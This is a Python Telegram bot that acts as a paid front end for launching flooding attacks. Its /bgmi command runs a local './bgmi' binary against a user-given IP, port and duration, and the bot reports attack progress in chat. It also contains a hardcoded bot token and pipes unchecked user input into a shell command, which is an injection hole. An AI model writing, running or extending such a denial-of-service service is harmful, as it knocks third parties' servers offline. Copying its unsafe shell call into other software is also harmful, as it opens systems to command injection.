import telebot
import subprocess
import datetime
import os
import time
import threading
from keep_alive import keep_alive

# Bot Setup
bot = telebot.TeleBot('8636140344:AAEUh1GNRu7vD9Rby_0dEIkz-dIODPxdsKA')
admin_id = ["8116319077"]

keep_alive()

# Memory Dictionaries for Cooldown and Feedback
user_cooldowns = {}
awaiting_feedback = {}

# 1. PREMIUM WELCOME MESSAGE
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"<b>🌟 WELCOME TO OJAS-PREMIUM 🌟</b>\n\n"
    response += f"👤 <b>User:</b> {user_name}\n"
    response += f"⚡ <b>Status:</b> <code>Online ✅</code>\n"
    response += f"🛡️ <b>Access:</b> <code>Premium User</code>\n\n"
    response += f"<i>Use /help to see all available commands.</i>"
    bot.reply_to(message, response, parse_mode='HTML')

# 2. PREMIUM HELP MESSAGE
@bot.message_handler(commands=['help'])
def help_command(message):
    response = "<b>🚀 OJASBGMI Commands:</b>\n\n"
    response += "🗡️ <b>/bgmi &lt;target&gt; &lt;port&gt; &lt;time&gt;</b> - Start Attack\n"
    response += "📊 <b>/myinfo</b> - Check your status\n"
    bot.reply_to(message, response, parse_mode='HTML')

# 3. PREMIUM INFO MESSAGE
@bot.message_handler(commands=['myinfo'])
def info(message):
    response = f"👤 <b>User:</b> {message.from_user.first_name}\n🆔 <b>ID:</b> <code>{message.chat.id}</code>"
    bot.reply_to(message, response, parse_mode='HTML')

# 4. FEEDBACK HANDLER (Photo check)
@bot.message_handler(content_types=['photo'])
def handle_feedback(message):
    user_id = str(message.chat.id)
    if awaiting_feedback.get(user_id, False):
        awaiting_feedback[user_id] = False
        bot.reply_to(message, "✅ <b>Feedback accepted! You can now launch your next attack.</b>", parse_mode='HTML')

# Subprocess run code logic (Separated for threading)
def run_attack(target, port, duration):
    subprocess.run(f"./bgmi {target} {port} {duration} 500", shell=True)

# 5. TITAN-STYLE ATTACK COMMAND
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name

    # Check Admin Access
    if user_id not in admin_id:
        bot.reply_to(message, "<b>⚠️ ACCESS DENIED ⚠️</b>\n\nThis is a private premium bot. Contact @mesh213 to buy access.", parse_mode='HTML')
        return

    # Check Feedback 
    if awaiting_feedback.get(user_id, False):
        bot.reply_to(message, "⚠️ <b>You must send a feedback photo before your next attack!</b>\n<i>Please send any screenshot/photo as feedback.</i>", parse_mode='HTML')
        return

    # Check Cooldown
    if user_id in user_cooldowns:
        time_since_last = time.time() - user_cooldowns[user_id]
        if time_since_last < 30: # 30 Seconds Cooldown
            remaining_cd = int(30 - time_since_last)
            bot.reply_to(message, f"⏳ <b>Wait {remaining_cd}s before next attack!</b>", parse_mode='HTML')
            return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "<b>Usage:</b> <code>/bgmi &lt;target&gt; &lt;port&gt; &lt;time&gt;</code>", parse_mode='HTML')
        return

    target, port = command[1], command[2]
    try:
        duration = int(command[3])
    except ValueError:
        bot.reply_to(message, "⚠️ <b>Time must be an integer!</b>", parse_mode='HTML')
        return

    # Start Attack in Background Thread
    attack_thread = threading.Thread(target=run_attack, args=(target, port, duration))
    attack_thread.start()

    # Initial Progress Message
    msg_text = f"🚀 <b>ATTACK IN PROGRESS</b> 🚀\n\n"
    msg_text += f"📌 <b>Target:</b> <code>{target}:{port}</code>\n"
    msg_text += f"⏱️ <b>Duration:</b> {duration} seconds\n"
    msg_text += f"📊 <b>Progress:</b> [░░░░░░░░░░] 0%\n"
    msg_text += f"⏳ <b>Elapsed:</b> 0s\n📉 <b>Remaining:</b> {duration}s\n"
    msg_text += f"👤 <b>Launched by:</b> {user_name}\n"
    msg_text += f"🟢 <b>Status:</b> Running\n"
    
    sent_msg = bot.send_message(message.chat.id, msg_text, parse_mode='HTML')

    # Progress Bar Update Loop
    start_time = time.time()
    update_count = 0
    while time.time() - start_time < duration:
        time.sleep(5) # Update every 5 seconds (to avoid Telegram API limits)
        update_count += 1
        
        elapsed = int(time.time() - start_time)
        remaining = max(0, duration - elapsed)
        progress = min(100, int((elapsed / duration) * 100))
        
        blocks = int(progress / 10)
        bar = "█" * blocks + "░" * (10 - blocks)
        
        new_text = f"🚀 <b>ATTACK IN PROGRESS</b> 🚀\n\n"
        new_text += f"📌 <b>Target:</b> <code>{target}:{port}</code>\n"
        new_text += f"⏱️ <b>Duration:</b> {duration} seconds\n"
        new_text += f"📊 <b>Progress:</b> [{bar}] {progress}%\n"
        new_text += f"⏳ <b>Elapsed:</b> {elapsed}s\n📉 <b>Remaining:</b> {remaining}s\n"
        new_text += f"👤 <b>Launched by:</b> {user_name}\n"
        new_text += f"🟢 <b>Status:</b> Running\n"
        new_text += f"🆔 <b>Update:</b> #{update_count}"
        
        try:
            bot.edit_message_text(new_text, message.chat.id, sent_msg.message_id, parse_mode='HTML')
        except Exception:
            pass # Ignore if rate limited

    attack_thread.join() # Confirm attack is done

    # Final Finished Message & Trigger Cooldown/Feedback
    bot.send_message(message.chat.id, "✅ <b>Attack Finished!</b>\n\n⚠️ <i>Please send a feedback photo to unlock your next attack.</i>", parse_mode='HTML')
    user_cooldowns[user_id] = time.time()
    awaiting_feedback[user_id] = True

bot.polling(none_stop=True)
